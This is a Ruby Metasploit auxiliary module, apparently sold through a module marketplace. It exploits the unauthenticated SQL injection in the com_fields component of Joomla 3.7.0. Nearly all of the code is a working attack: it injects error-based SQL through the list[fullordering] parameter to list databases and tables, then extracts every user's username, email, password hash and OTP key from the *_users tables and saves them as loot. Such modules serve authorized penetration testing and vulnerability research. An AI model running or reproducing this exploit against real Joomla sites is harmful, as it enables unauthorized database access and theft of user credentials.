##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla com_fields SQL Injection User Enumeration',
      'Description'    => %q{
This module exploits an unauthenticated SQL injection in Joomla in order to
enumerate users and password hashes.

Joomla is one of the most popular open-source CMS solutions, widely used
around the world. Version 3.7.0 introduced new functionality in the com_fields
component that suffered from an unauthenticated SQL injection. This issue
was fixed in 3.7.1. This module exploits the SQL injection in order to
pull the current user and password hash information out of the Joomla
database.

    Categories: Open Source, Joomla

    Price: 5

    Video: https://asciinema.org/a/d5zpez1nvyrvossbidxgeqtpe

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
          ['URL', 'https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html']
        ],
      'Author'         =>
        [
          'VolatileMinds'
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => 'May 17 2017'
    ))

    register_options(
      [
         OptString.new("TARGETURI", [true, 'The relative Joomla URI', '/']),
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_fields',
        'view' => 'fields',
        'layout' => 'modal',
        'list[fullordering]' => "fdsa ASC'"
      }
    })

    if res && res.code == 500
      return Msf::Exploit::CheckCode::Vulnerable
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def run
    users = []

    front_marker = Rex::Text.rand_text_alpha(7)
    back_marker = Rex::Text.rand_text_alpha(7)

    dbs =[]
    db_count = "(SELECT 8342 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT HEX(IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
    res = make_injected_request(db_count)
    db_count = nil
    db_count = $1 if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/
    db_count = [db_count].pack("H*").to_i

    0.upto(db_count-1) do |db|
      db_name = "(SELECT 2264 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((HEX(IFNULL(CAST(schema_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
      res = make_injected_request(db_name)
      dbs << [$1].pack("H*") if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/
    end

    dbs.delete('mysql')
    dbs.delete('information_schema')
    dbs.delete('performance_schema')

    dbs.each do |db|
      table_count = "(SELECT 9598 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT HEX(IFNULL(CAST(COUNT(table_name) AS CHAR),0x20)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
      res = make_injected_request(table_count)
      table_count = [$1].pack("H*").to_i if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/
      tables = []
      0.upto(table_count-1) do |table|
        table_name = "(SELECT 7603 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((HEX(IFNULL(CAST(table_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{table},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
        res = make_injected_request(table_name)
        table_name = [$1].pack("H*") if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/
        tables << table_name if table_name =~ /_users$/
      end

      tables.each do |table|
        user_count = "(SELECT 4173 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT HEX(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM #{db}.#{table}),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
        res = make_injected_request(user_count)
        user_count = [$1].pack("H*").to_i if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/

        0.upto(user_count-1) do |u|
          user = {}
          cols = ['id', 'name', 'otep', 'email', 'block', 'otpKey', 'params', 'username', 'password', 'sendEmail', 'activation', 'resetCount', 'registerDate', 'requiresReset', 'lastResetTime', 'lastVisitDate']

          cols.each do |col|
            val = ''
            tmp = nil
            i = 1
            while tmp != ''
              tmp = ''
              get_val = "(SELECT 4588 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((HEX(IFNULL(CAST(#{col} AS CHAR),0x20))),#{i},50) FROM #{db}.#{table} ORDER BY id LIMIT #{u},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
              res = make_injected_request(get_val)
              tmp = [$1].pack("H*") if res && res.body =~ /#{front_marker}(.*?)#{back_marker}/
              val << tmp
              i = i + 50
            end
            user[col] = val
          end
          users << user
        end
      end
    end

    path = store_loot('joomla_users', 'application/json', datastore['RHOST'], users.to_json, 'joomla_com_fields.users')

    print_good('Users saved to file: ' + path)

  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_fields',
        'view' => 'fields',
        'layout' => 'modal',
        'list[fullordering]' => sql
      }
    })
  end
end

